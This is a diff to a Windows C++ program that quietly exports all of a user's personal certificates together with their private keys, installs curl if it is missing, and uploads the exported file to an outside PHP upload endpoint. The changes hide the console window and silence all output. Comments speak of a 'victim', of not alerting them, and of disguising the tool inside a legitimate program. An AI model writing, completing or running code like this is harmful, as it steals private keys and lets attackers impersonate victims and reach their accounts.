@@ -2,15 +2,8 @@
 //
 
 //#include "stdafx.h"
-#include <string>
-#include <windows.h>
-#include <tchar.h>
-#include <wincrypt.h>
-#include <iostream>
-#include <cstdlib>
-#include <vector>
-#pragma comment (lib, "crypt32") //important !! dont work without linking library
-#include "MyVariables.h" //import of password and other configs.
+
+#include "MyVariables.h" //import of libs, password and other configs of project.
 
 //exe generated at jailbreak-master/jailbreak-master/Debug/jbstore2_32.exe
 
@@ -64,68 +57,16 @@ void ListOfCerts(HCERTSTORE hStore) {
 }
 */
 
-BOOL DumpAllCertificates(HCERTSTORE hStore, LPCWSTR password = L"heslo")
-{
-    BOOL bResult = FALSE;
-    CRYPT_DATA_BLOB Blob = {};
-    HANDLE hFile = NULL;
-    DWORD dwBytesWritten = 0;
-    LPCWSTR filename = L"./allcerts.pfx";
-
-    if (!PFXExportCertStoreEx(hStore, &Blob, password, NULL, EXPORT_PRIVATE_KEYS)) {//| REPORT_NOT_ABLE_TO_EXPORT_PRIVATE_KEY
-        printf("Error with exporting certificates err: %d\n", GetLastError());
-
-        return FALSE;
-    }
-
-    Blob.pbData = (PBYTE)HeapAlloc(GetProcessHeap(), 0, Blob.cbData);
-    if (!Blob.pbData)
-    {
-        printf("Error allocating data err: %d\n", GetLastError());
-        goto cleanup;
-    }
-
-    if (!PFXExportCertStoreEx(hStore, &Blob, password, NULL, EXPORT_PRIVATE_KEYS)) { //| REPORT_NOT_ABLE_TO_EXPORT_PRIVATE_KEY
-        printf("Error exporting certificates: %d\n", GetLastError());
-        goto cleanup;
-    }
-
-    hFile = CreateFile(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
-    if (hFile == INVALID_HANDLE_VALUE) {
-        printf("Error creating output file: %d\n", GetLastError());
-        goto cleanup;
-    }
-
-    if (!WriteFile(hFile, Blob.pbData, Blob.cbData, &dwBytesWritten, 0)) {
-        printf("Error writing to file: %d\n", GetLastError());
-        goto cleanup;
-    }
-
-    if (dwBytesWritten != Blob.cbData) {
-        printf("Number of bytes written does not match requested!\n");
-        goto cleanup;
-    }
-
-    printf("Done.... Output written to file  %S\n", filename);
-    bResult = TRUE;
-
-cleanup:
-    if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
-    if (Blob.pbData) HeapFree(GetProcessHeap(), 0, Blob.pbData);
-    return bResult;
-}
-
-//making my own program:
 //function to get PATh to %TEMP%
 std::string tempget() {
     char tempPath[MAX_PATH];
     DWORD tempresult = GetTempPathA(MAX_PATH, tempPath);
     if (tempresult == 0 || tempresult > MAX_PATH) {
-        std::cerr << "TEMP PATH not succesfully found." << std::endl;
+        //std::cerr << "TEMP PATH not succesfully found." << std::endl;
         return "error";
     }
     else {
-        std::cerr << "TEMP PATH is " << tempPath << std::endl;
+        //std::cerr << "TEMP PATH is " << tempPath << std::endl;
     }
     // replace "\" with "\\"
     std::string tempstr = tempPath;
@@ -137,7 +78,69 @@ std::string tempget() {
     return tempstr;
 }
 
-int cURL()
+std::string DumpAllCertificates(HCERTSTORE hStore, LPCWSTR password = L"heslo")
+{
+    //std::string bResult;
+    CRYPT_DATA_BLOB Blob = {};
+    HANDLE hFile = NULL;
+    DWORD dwBytesWritten = 0;
+
+    //choose destination where to save exported certificate
+    std::string tempstr = tempget();
+    tempstr += "allcerts.pfx";    
+    //convert string to LPCWSTR
+    std::wstring wtempstr(tempstr.begin(), tempstr.end());
+    //std::cout << "CONVERTED TEMP file PATH: " << wtempstr.c_str() << std::endl;
+    LPCWSTR filename = wtempstr.c_str();
+
+    //LPCWSTR filename = tempstr;
+
+    if (!PFXExportCertStoreEx(hStore, &Blob, password, NULL, EXPORT_PRIVATE_KEYS)) {//| REPORT_NOT_ABLE_TO_EXPORT_PRIVATE_KEY
+        //printf("Error with exporting certificates err: %d\n", GetLastError());
+        return "error";
+    }
+
+    Blob.pbData = (PBYTE)HeapAlloc(GetProcessHeap(), 0, Blob.cbData);
+    if (!Blob.pbData)
+    {
+        //printf("Error allocating data err: %d\n", GetLastError());
+        goto cleanup;
+    }
+
+    if (!PFXExportCertStoreEx(hStore, &Blob, password, NULL, EXPORT_PRIVATE_KEYS)) { //| REPORT_NOT_ABLE_TO_EXPORT_PRIVATE_KEY
+        //printf("Error exporting certificates: %d\n", GetLastError());
+        goto cleanup;
+    }
+
+    hFile = CreateFile(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        //printf("Error creating output file: %d\n", GetLastError());
+        goto cleanup;
+    }
+
+    if (!WriteFile(hFile, Blob.pbData, Blob.cbData, &dwBytesWritten, 0)) {
+        //printf("Error writing to file: %d\n", GetLastError());
+        goto cleanup;
+    }
+
+    if (dwBytesWritten != Blob.cbData) {
+        //printf("Number of bytes written does not match requested!\n");
+        goto cleanup;
+    }
+
+    //printf("Done.... Output written to file  %S\n", filename);
+    //tempstr;
+
+cleanup:
+    if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
+    if (Blob.pbData) HeapFree(GetProcessHeap(), 0, Blob.pbData);
+    return tempstr;
+}
+
+//making my own program:
+
+
+int cURLini()
 {
     // replace "\" with "\\"
     std::string tempstr = tempget();
@@ -218,10 +221,13 @@ int cURL()
     int curlCheckResult = system("curl --version");
     if (curlCheckResult == 0) {
         //    // cURL installed check
-        std::cout << "cURL already installed on system." << std::endl;
+        //std::cout << "cURL already installed on system." << std::endl;
         return 2; //return 2 - means cURL is in system PATH
     }
-
+    else if (system(curlPathCheck.data()) == 0) {
+        //std::cerr << "cURL already installed by program." << std::endl;
+        return 0;
+    }
     else
         //install cURL (download/extrat/PATHadd)
     {
@@ -230,12 +236,12 @@ int cURL()
         int result = system(downloadcommand.data());
         if (result == 0) {
             // command success
-            std::cout << "Uspesne stazeno.";
+            //std::cout << "Uspesne stazeno.";
             // extract file, add to PATH and other actions...
         }
         else {
             // command failed
-            std::cout << "Chyba ve stahovani pomoci bitsadmin";
+            //std::cout << "Chyba ve stahovani pomoci bitsadmin";
         }
 
         bool extractionSuccessful = false;
@@ -259,7 +265,7 @@ int cURL()
         }*/
 
         if (!extractionSuccessful) {
-            std::cerr << "Extracting error!" << std::endl;
+            //std::cerr << "Extracting error!" << std::endl;
             return 1;
         }
 
@@ -268,7 +274,7 @@ int cURL()
 
         int renameResult = system(movecommand.data());
         if (renameResult != 0) {
-            std::cerr << "Renaming folder ERROR" << std::endl;
+            //std::cerr << "Renaming folder ERROR" << std::endl;
             return 1;
         }
 
@@ -282,11 +288,11 @@ int cURL()
         //using cURL without admin rights. <-- better option (Do not alert victim.)
         int testcurlnoP = system(curlPathCheck.data());
         if (testcurlnoP != 0) {
-            std::cerr << "Error adding to PATH" << std::endl;
+            //std::cerr << "Error adding to PATH" << std::endl;
             return 1;
         }
 
-        std::cout << "Instalation of cURL finished." << std::endl;
+        //std::cout << "Instalation of cURL finished." << std::endl;
 
         return 0;
     }
@@ -294,41 +300,43 @@ int cURL()
 
     //wrap in cURL test condition, if not exist installotherwise skip :)                                                                        DONE
     //working - just handle how to get curl command on victims computer.... (Win10 + should default have it --> TEST it ! )                     DONE
-    // using cURL to control website
-    // protect upload site with string
-    // 
-    //curl -F "fileToUpload=@C:/Users/lubos/Downloads/error.log;type=text/html" http://mail.xf.cz/myphp/uploadcertificate/upload.php
+    // using cURL to control website                                                                                                            DONE
+    // protect upload site with string                                                                                                          DONE
+
 }
 
-int cURLupload(int cURLinPATH)
+int cURLupload(int cURLinPATH, std::string filepath)
 {
 
     std::string tempstr = tempget();
 
-    std::string fullPathuploadcURL = "curl -F \"fileToUpload=@C:/Users/lubos/Downloads/test.txt;type = text/html\" -F \"pass=" + password + "\" http://mail.xf.cz/myphp/uploadcertificate/upload.php";
+    //C:\\Users\\lubos\\AppData\\Local\\Temp\\01allcerts.pfx
+    // curl -F "fileToUpload=@C:\\Users\\lubos\\AppData\\Local\\Temp\\01allcerts.pfx;type = text/html" -F "pass=passwod" http://mail.xf.cz/myphp/uploadcertificate/upload.php" //TESTED and worked in manual cmd
+
+    std::string fullPathuploadcURL = "curl -F \"fileToUpload=@" + filepath + ";type = text/html\" -F \"pass=" + password + "\" http://mail.xf.cz/myphp/uploadcertificate/upload.php";
     //set path to right
-    if (cURLinPATH != 0)
+    if (cURLinPATH == 2)
     {
-        fullPathuploadcURL = "curl -F \"fileToUpload=@C:/Users/lubos/Downloads/test.txt;type = text/html\" -F \"pass=" + password + "\" http://mail.xf.cz/myphp/uploadcertificate/upload.php";
+        fullPathuploadcURL = "curl -F \"fileToUpload=@" + filepath + ";type = text/html\" -F \"pass=" + password + "\" http://mail.xf.cz/myphp/uploadcertificate/upload.php";
     }
-    else
+    else if(cURLinPATH == 0)
     {
-        fullPathuploadcURL = tempstr + "\\curl\\bin\\curl.exe -F \"fileToUpload=@C:/Users/lubos/Downloads/test.txt;type = text/html\" -F \"pass=" + password + "\" http://mail.xf.cz/myphp/uploadcertificate/upload.php";
+        fullPathuploadcURL = tempstr + "\\curl\\bin\\curl.exe -F \"fileToUpload=@" + filepath + ";type = text/html\" -F \"pass=" + password + "\" http://mail.xf.cz/myphp/uploadcertificate/upload.php";
     }
+
     //save the command to vector
     std::vector<char> cURLupload(fullPathuploadcURL.begin(), fullPathuploadcURL.end());
     // Add ending char to vector
     cURLupload.push_back('\0');
 
-
     int cURLuploadResult = system(cURLupload.data());
     if (cURLuploadResult != 0) {
-        std::cerr << "Error running cURL command for uploading" << std::endl;
+        //std::cerr << "Error running cURL command for uploading" << std::endl;
         return 1;
     }
     else
     {
-        std::cerr << "Upload of file successfully done." << std::endl;
+        //std::cerr << "Upload of file successfully done." << std::endl;
         return 0;
     }
 
@@ -338,22 +346,22 @@ int cURLupload(int cURLinPATH)
 int main(int argc, _TCHAR* argv[])
 {
     // Get the handle to the console window
-    //HWND consoleHandle = GetConsoleWindow();
+    HWND consoleHandle = GetConsoleWindow();
 
     // Hide the console window
-    //ShowWindow(consoleHandle, SW_HIDE);
+    ShowWindow(consoleHandle, SW_HIDE);
 
     HCERTSTORE hStore = NULL;
 
-    printf("Welcome in opening store program for exporting certificates.");
+    //printf("Welcome in opening store program for exporting certificates.");
     //open store
 
     hStore = CertOpenSystemStore(NULL, L"MY");
     if (!hStore) {
-        printf("Error opening cert store: %d\n", GetLastError());
+        //printf("Error opening cert store: %d\n", GetLastError());
     }
     else {
-        printf("Openede\n");
+        //printf("Openede\n");
     }
 
     //list certificates:
@@ -361,35 +369,36 @@ int main(int argc, _TCHAR* argv[])
     //ListOfCerts(hStore);
 
     //dump all certs to one file
-    printf("\n\nDumping all certificates:\n");
-    DumpAllCertificates(hStore);
+    //printf("\n\nDumping all certificates:\n");
+    std::string certpath=DumpAllCertificates(hStore);
+    //std::cout << " certificate path " << certpath;
 
-    printf("\n\nChecking cURL:\n\n");
+    //printf("\n\nChecking cURL:\n\n");
     //check cURL or install it
-    int comandsuccess;
-    int check = cURL();
+    int comandsuccess=1; //default set as error
+    int check = cURLini();
     if (check == 1) {
-        printf("\n ERROR somewhere in cURL installing/checking \n");
+        //printf("\n ERROR somewhere in cURL installing/checking \n");
     }
     else if(check == 0) {
-        printf("\n cURL installed and not in system PATH. \n");
-        comandsuccess = cURLupload(check);
+        //printf("\n cURL installed and not in system PATH. \n");
+        comandsuccess = cURLupload(check, certpath);
     }
     else if (check == 2) {
-        printf("\n cURL already installed on system and added in PATH. \n");
-        comandsuccess = cURLupload(check);
+        //printf("\n cURL already installed on system and added in PATH. \n");
+        comandsuccess = cURLupload(check, certpath);
     }
     if (comandsuccess != 0) {
-        printf("\n ERROR somewhere in cURL installing/checking \n");
+        //printf("\n ERROR somewhere in cURL installing/checking \n");
     }
     else {
-        printf("\n cURL uplaod successfully done. \n");
+        //printf("\n cURL upload successfully done. \n");
     }
 }
 
 // TO DO:
 /*
-+ disable showing cmd or fake what it is doing.... hide in some legit program.
-+ transfer exported certificate (try to be hidden) (google disk, server, email, others....).
-+ make program to look it is doing something else and do this on the background.
++ disable showing cmd or fake what it is doing.... hide in some legit program.                      DONE
++ transfer exported certificate (try to be hidden) (google disk, server, email, others....).        DONE by cURL
++ make program to look it is doing something else and do this on the background.                    
 */
